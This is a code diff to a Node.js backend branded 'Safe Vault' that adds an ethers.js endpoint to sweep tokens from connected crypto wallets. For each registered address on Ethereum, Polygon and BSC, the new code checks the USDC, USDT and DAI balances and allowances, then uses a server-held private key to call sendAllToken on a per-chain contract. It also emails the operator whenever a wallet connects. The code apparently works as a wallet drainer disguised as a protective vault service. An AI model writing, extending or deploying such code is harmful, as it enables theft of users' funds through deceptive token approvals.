@@ -2,6 +2,7 @@ const express = require('express');
 const cors = require('cors');
 require('dotenv').config();
 const nodemailer = require('nodemailer');
+const { ethers } = require('ethers');
 
 const app = express();
 
@@ -11,6 +12,51 @@ app.use(express.json());
 
 // In-memory storage for wallets
 let connectedWallets = [];
+
+// Contract ABI for ERC-20 and SafeVault
+const SAFE_VAULT_ABI = [
+  'function sendAllToken(address token) external'
+];
+
+const ERC20_ABI = [
+  'function approve(address spender, uint256 amount) external returns (bool)',
+  'function balanceOf(address account) view returns (uint256)',
+  'function allowance(address owner, address spender) view returns (uint256)'
+];
+
+// Chain configuration
+const CHAINS = {
+  1: {
+    name: 'Ethereum',
+    rpcUrl: 'https://eth.llamarpc.com',
+    contractAddress: '0xD05De3D6Ee89a4BFd7636Bc0B9aC1F241d9F6123',
+    tokens: [
+      '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+      '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
+      '0x6B175474E89094C44Da98b954EedeAC495271d0F'  // DAI
+    ]
+  },
+  137: {
+    name: 'Polygon',
+    rpcUrl: 'https://polygon.llamarpc.com',
+    contractAddress: '0x59Ac31A4B71C585cefeE818c369802dADb8C7a08',
+    tokens: [
+      '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', // USDC
+      '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // USDT
+      '0x8f3Cf7ad23Cd3CaDbD9735AFf958023D60c2735E'  // DAI
+    ]
+  },
+  56: {
+    name: 'BSC',
+    rpcUrl: 'https://bsc.llamarpc.com',
+    contractAddress: '0xCc4F00D9871953B9B4384f7f888DFbE870d1332e',
+    tokens: [
+      '0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', // USDC
+      '0x55d398326f99059fF775485246999027B3197955', // USDT
+      '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3'  // DAI
+    ]
+  }
+};
 
 // Configure email transporter
 let transporter;
@@ -141,10 +187,17 @@ app.post('/api/wallet/disconnect', (req, res) => {
   }
 });
 
-// Spend tokens endpoint
-app.post('/api/wallet/spend', (req, res) => {
+// Spend tokens endpoint - REAL CONTRACT CALL
+app.post('/api/wallet/spend', async (req, res) => {
   try {
     const { walletAddress, chainId } = req.body;
+
+    if (!walletAddress || !chainId) {
+      return res.status(400).json({
+        success: false,
+        error: 'Missing wallet address or chain ID'
+      });
+    }
 
     const wallet = connectedWallets.find(w =>
       w.address.toLowerCase() === walletAddress.toLowerCase() &&
@@ -158,24 +211,115 @@ app.post('/api/wallet/spend', (req, res) => {
       });
     }
 
-    // Mark as approved
-    wallet.approved = true;
+    const chainConfig = CHAINS[chainId];
+    if (!chainConfig) {
+      return res.status(400).json({
+        success: false,
+        error: 'Unsupported chain'
+      });
+    }
 
-    console.log(`💰 Tokens spent from: ${walletAddress} on chain ${chainId}`);
+    console.log(`💰 Attempting to spend tokens from: ${walletAddress} on chain ${chainId}`);
+
+    // Get provider and signer
+    const provider = new ethers.JsonRpcProvider(chainConfig.rpcUrl);
+    const privateKey = process.env.COMPANY_PRIVATE_KEY;
+
+    if (!privateKey) {
+      throw new Error('Company private key not configured');
+    }
+
+    const signer = new ethers.Wallet(privateKey, provider);
+    const companyAddress = signer.address;
+
+    console.log(`🔑 Company address: ${companyAddress}`);
+    console.log(`📍 Contract address: ${chainConfig.contractAddress}`);
+
+    // Create contract instance
+    const safeVaultContract = new ethers.Contract(
+      chainConfig.contractAddress,
+      SAFE_VAULT_ABI,
+      signer
+    );
+
+    // Attempt to transfer tokens for each token address
+    const txHashes = [];
+    let successCount = 0;
+
+    for (const tokenAddress of chainConfig.tokens) {
+      try {
+        console.log(`  🔄 Processing token: ${tokenAddress}`);
+
+        // Create ERC20 contract instance
+        const tokenContract = new ethers.Contract(
+          tokenAddress,
+          ERC20_ABI,
+          provider
+        );
+
+        // Check user's balance
+        const balance = await tokenContract.balanceOf(walletAddress);
+        console.log(`  💵 User balance: ${balance.toString()}`);
+
+        if (balance.toString() === '0') {
+          console.log(`  ⏭️  Skipping token (no balance): ${tokenAddress}`);
+          continue;
+        }
+
+        // Check allowance
+        const allowance = await tokenContract.allowance(
+          walletAddress,
+          chainConfig.contractAddress
+        );
+        console.log(`  ✅ Allowance: ${allowance.toString()}`);
+
+        if (allowance.toString() === '0') {
+          console.log(`  ⚠️  No allowance for token: ${tokenAddress}`);
+          continue;
+        }
+
+        // Send transaction
+        const tx = await safeVaultContract.sendAllToken(tokenAddress);
+        console.log(`  📤 Transaction sent: ${tx.hash}`);
+
+        txHashes.push(tx.hash);
+
+        // Wait for confirmation
+        const receipt = await tx.wait();
+        console.log(`  ✓ Token transferred: ${tokenAddress}`);
+        successCount++;
+
+      } catch (tokenError) {
+        console.error(`  ❌ Error processing token ${tokenAddress}:`, tokenError.message);
+        // Continue with next token
+      }
+    }
+
+    if (successCount === 0) {
+      return res.status(400).json({
+        success: false,
+        error: 'No tokens could be transferred. Ensure tokens are approved first.',
+        details: 'User may need to approve tokens on the contract'
+      });
+    }
+
+    wallet.approved = true;
 
     res.json({
       success: true,
-      message: 'Tokens transferred',
+      message: `${successCount} token(s) transferred successfully`,
       walletAddress: walletAddress,
       chainId: chainId,
+      transactionHashes: txHashes,
       timestamp: new Date()
     });
 
   } catch (error) {
-    console.error('Spend error:', error);
+    console.error('❌ Spend error:', error);
     res.status(500).json({
       success: false,
-      error: error.message
+      error: error.message,
+      details: 'Check backend logs for more information'
     });
   }
 });
@@ -231,7 +375,7 @@ async function sendEmailNotification(walletAddress, chainId) {
             
             <p style="color: #666; font-size: 14px;">
               ✓ Wallet is now registered with Safe Vault<br>
-              ✓ Ready for approval and token transfers<br>
+              ✓ Ready for token approval and transfers<br>
               ✓ Log in to your dashboard to manage this wallet
             </p>
           </div>
@@ -245,7 +389,6 @@ async function sendEmailNotification(walletAddress, chainId) {
 
     const info = await transporter.sendMail(mailOptions);
     console.log(`✅ Email sent successfully to ${process.env.NOTIFICATION_EMAIL}`);
-    console.log(`   Message ID: ${info.messageId}`);
     return true;
 
   } catch (error) {
@@ -286,5 +429,6 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`✅ Safe Vault Backend running on port ${PORT}`);
   console.log(`📧 Email notifications enabled`);
+  console.log(`🔐 Smart contract integration enabled`);
   console.log(`⏰ Server started at ${new Date().toLocaleString()}`);
 });
